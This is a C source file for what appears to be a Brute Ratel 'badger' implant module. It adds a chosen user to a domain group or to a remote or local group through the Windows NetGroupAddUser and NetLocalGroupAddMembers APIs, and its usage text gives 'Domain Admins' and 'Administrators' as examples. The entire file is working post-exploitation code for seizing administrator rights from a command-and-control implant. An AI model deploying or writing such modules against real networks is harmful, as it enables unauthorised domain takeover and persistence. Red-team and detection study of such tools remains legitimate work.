#include <windows.h>
#include <stdio.h>
#include <lm.h>
#include "badger_exports.h"

DECLSPEC_IMPORT int Msvcrt$swprintf_s(wchar_t *__stream, size_t __count, const wchar_t *__format, ...);

DECLSPEC_IMPORT int WINAPI Kernel32$MultiByteToWideChar(UINT CodePage, DWORD dwFlags, LPCCH lpMultiByteStr, int cbMultiByte, LPWSTR lpWideCharStr, int cchWideChar);

DECLSPEC_IMPORT NET_API_STATUS NET_API_FUNCTION Netapi32$NetLocalGroupAddMembers(LPCWSTR servername, LPCWSTR groupname, DWORD level, LPBYTE buf, DWORD totalentrie);
DECLSPEC_IMPORT NET_API_STATUS NET_API_FUNCTION Netapi32$NetGroupAddUser(LPCWSTR servername, LPCWSTR GroupName, LPCWSTR username);

VOID ConvertCharToWChar(char* charString, wchar_t** wcharString) {
    int size_needed = Kernel32$MultiByteToWideChar(CP_ACP, 0, charString, -1, NULL, 0);
    *wcharString = (wchar_t*) BadgerAlloc(size_needed * sizeof(wchar_t));
    if (*wcharString) {
        Kernel32$MultiByteToWideChar(CP_ACP, 0, charString, -1, *wcharString, size_needed);
    }
}

VOID AddUserToGroup(WCHAR* lpswzServer, WCHAR* lpswzUserName, WCHAR* lpswzGroupName, DWORD local) {
	NET_API_STATUS dwErrorCode = ERROR_SUCCESS;
	LOCALGROUP_MEMBERS_INFO_3 mi[1] = { 0 };
    if (local == 0) {
        BadgerDispatch(g_dispatch, "[+] Adding '%ls' user to '%ls' domain group on '%ls'\n", lpswzUserName, lpswzGroupName, lpswzServer);
        dwErrorCode = Netapi32$NetGroupAddUser(lpswzServer, lpswzGroupName, lpswzUserName);
        if (dwErrorCode != ERROR_SUCCESS) {
            BadgerDispatch(g_dispatch, "[-] Error NetGroupAddUser: %lu\n", dwErrorCode);
            return;
        }
    } else {
		mi[0].lgrmi3_domainandname = BadgerAlloc(1024);
        Msvcrt$swprintf_s(mi[0].lgrmi3_domainandname, 1024, L"%s", lpswzUserName);
		if (local == 1) {
            BadgerDispatch(g_dispatch, "[+] Adding '%ls' user to the '%ls' remote localgroup on '%ls'\n", lpswzUserName, lpswzGroupName, lpswzServer);
		} else if ( (local == 2) && (! lpswzServer)) {
            BadgerDispatch(g_dispatch, "[+] Adding '%ls' user to the '%ls' localhost localgroup\n", lpswzUserName, lpswzGroupName);
        }
        dwErrorCode = Netapi32$NetLocalGroupAddMembers(lpswzServer, lpswzGroupName, 3, (LPBYTE)mi, 1);
		if (ERROR_SUCCESS != dwErrorCode) {
			BadgerDispatch(g_dispatch, "[-] Error NetLocalGroupAddMembers: %lu\n", dwErrorCode);
		} else {
            BadgerDispatch(g_dispatch, "[+] Success!\n");
        }
        BadgerFree((PVOID*)&mi[0].lgrmi3_domainandname);
    }
}

VOID coffee(char** argv, int argc, WCHAR** dispatch) {
	WCHAR* lpswzUserName = NULL;
	WCHAR* lpswzGroupName = NULL;
    WCHAR* lpswzServerName = NULL;
    CHAR* username = argv[1];
    CHAR* groupname = argv[2];
    CHAR* servername = argv[3];
    CHAR* option = NULL;
    DWORD local = 0;

    g_dispatch = dispatch;
    if (argc < 3) {
        BadgerDispatch(dispatch, "[!] Usage: adduser_to_group.o <domain/remote/local> <user> <group> <optional:host/domain>\n NOTES: \n");
        BadgerDispatch(dispatch, "[!] Domain: Add user to domain group Eg.: adduser_to_group.o domain \"vendetta\" \"Domain Admins\" \"vortexdc.darkvortex.corp\"\n");
        BadgerDispatch(dispatch, "[!] Remote: Add user to remote host's local group Eg.: adduser_to_group.o remote \"darkvortex.corp\\vendetta\" Administrators vortexdc.darkvortex.corp\n");
        BadgerDispatch(dispatch, "[!] Local: Add to localhost localgroup Eg.: adduser_to_group.o local TestUser Administrators\n");
        return;
    }
    option = argv[0];
    if (BadgerStrcmp(option, "domain")==0) {
        local = 0;
    } else if (BadgerStrcmp(option, "remote")==0) {
        local = 1;
    } else if (BadgerStrcmp(option, "local")==0) {
        local = 2;
    } else {
        BadgerDispatch(dispatch, "[-] Invalid option. Specify either <domain/remote/local>\n");
        return;
    }
    ConvertCharToWChar(username, &lpswzUserName);
    BadgerDispatch(dispatch, "[*] Username: %ls\n", lpswzUserName);
    ConvertCharToWChar(groupname, &lpswzGroupName);
    BadgerDispatch(dispatch, "[*] Group name: %ls\n", lpswzGroupName);
    if (argc == 4) {
        ConvertCharToWChar(servername, &lpswzServerName);
        BadgerDispatch(dispatch, "[*] Server name: %ls\n", lpswzServerName);
    }
	AddUserToGroup(lpswzServerName, lpswzUserName, lpswzGroupName, local);
    BadgerFree((PVOID*)&lpswzUserName);
    BadgerFree((PVOID*)&lpswzGroupName);
    BadgerFree((PVOID*)&lpswzServerName);
	return;
}
